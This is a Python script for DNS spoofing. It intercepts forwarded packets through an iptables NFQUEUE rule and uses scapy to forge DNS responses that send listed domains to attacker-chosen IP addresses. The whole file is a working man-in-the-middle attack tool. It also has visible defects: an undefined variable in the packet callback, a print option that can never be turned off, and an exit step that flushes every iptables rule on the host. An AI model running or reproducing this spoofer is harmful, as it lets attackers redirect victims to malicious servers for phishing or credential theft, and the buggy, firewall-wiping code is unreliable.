from scapy.all import *
from netfilterqueue import NetfilterQueue
import os
import argparse

#Create global variables for arguments (packetfunctions require 1 argument to conform to Netfilterqueue)

dns_map = {
}
#Default values
filename = "map.txt"
queue_num = 0
use_print = True

def resolve_args():
    global filename
    global queue_num
    global use_print

    #Get the values from the potential arguments
    parser = argparse.ArgumentParser()
    parser.add_argument("-f", "--file", dest = "file", help = "File with replacement map, default map.txt")
    parser.add_argument("-q", "--queue", dest = "queue", help = "Queuenumber of netfilterqueue, default 0")
    parser.add_argument("-p", "--print", dest = "use_print", help = "Print actions, default 1 (0 | 1)")
    options = parser.parse_args()
    if options.file:
        filename = options.file
    if options.queue:
        queue_num = int(options.queue)
    if options.use_print:
        if options.use_print == 0:
            use_print = False
    return options

#Fill in the DNS map, every line in file is:
#{url}-{ipV4}
def setup_map():
    global dns_map
    mapfile = open(filename, 'r')
    lines = mapfile.readlines()

    dns_map = {}
    for line in lines:
        parts = (line.replace("\n","")).split("-")
        site = parts[0]
        ip = parts[1]
        #dns requests have a . at the end, urls don't so we add them if they were not added
        if(not (site[-1] == '.')):
            site = site + '.'
        dns_map[bytes(site, 'utf-8')] = ip
    mapfile.close()

#Easy optional print with 2 arguments
def iPrint(text, second=None):
    if(use_print):
        if(second==None):
            print(text)
        else:
            print(text, second)

#Every intercepted packets is send through this function. Because it is a callback, it can only have 1 parameter
def queue_callback2(packet):
    #Convert raw packet to a scapy packets for inspection
    scapy_packet = IP(packet.get_payload())
    #Only change DNS responses
    if (scapy_packet.haslayer(DNSQR) and pkt[DNS].ancount == 0):
        iPrint("Packet received:")
        iPrint("[IP Before]:", scapy_packet.summary())
        try:
            #It is a DNS response, so modify the response
            scapy_packet = modify_packet2(scapy_packet)
        except IndexError:
            #Index error can occur when selecting the UDP section, just pass the response through to avoid non-responsiveness
            iPrint("IndexError occured")
            pass
        iPrint("[IP After ]:", scapy_packet.summary())
        iPrint("")
        #Set the payload of the original packet to the modified scapy_packet
        packet.set_payload(bytes(scapy_packet))
    #Accept the packet, regardless of wheter it was modified
    packet.accept()


def modify_packet2(packet):
    #Get the name of the requested site
    qname = packet[DNSQR].qname
    #Return the packet without modification if it is not in the list of sites to spoof
    if qname not in dns_map:
        iPrint("no modification:", qname)
        return packet
    #We set the answerfield of the response to our own IP-addres

    new_packet = IP(dst=packet[IP].src)/UDP(dport=packet[UDP].sport, sport=53)/DNS(id=packet[DNS].id,qr=1,ancount=1,an=DNSRR(rrname=qname, rdata=dns_map[qname]))
    iPrint("Modified:", qname)
    iPrint(new_packet.summary())
    iPrint(new_packet[DNS].summary())
    iPrint(new_packet[DNSRR].summary())
    #Return the packet with the modified resonse
    return new_packet



if __name__ == "__main__":
    resolve_args()
    setup_map()
    #Set the rule in the iptables
    iPrint("Setting up forwarding rule in iptables")
    os.system("iptables -I FORWARD -j NFQUEUE --queue-num {}".format(queue_num))

    iPrint("DNS spoofing map:")
    iPrint(dns_map)
    queue = NetfilterQueue()
    try:
        #Bind the callback function to the queue and set it running until it exits with Ctrl+C
        queue.bind(queue_num, queue_callback2)
        iPrint("Starting DNS spoofing")
        queue.run()
    except KeyboardInterrupt:
        #If we exit with Ctrl+C, we remove the rule we set at the start by flushing the tables
        iPrint("Flushing iptables, removing the forwarding rule")
        os.system("iptables --flush")
        iPrint("Program done")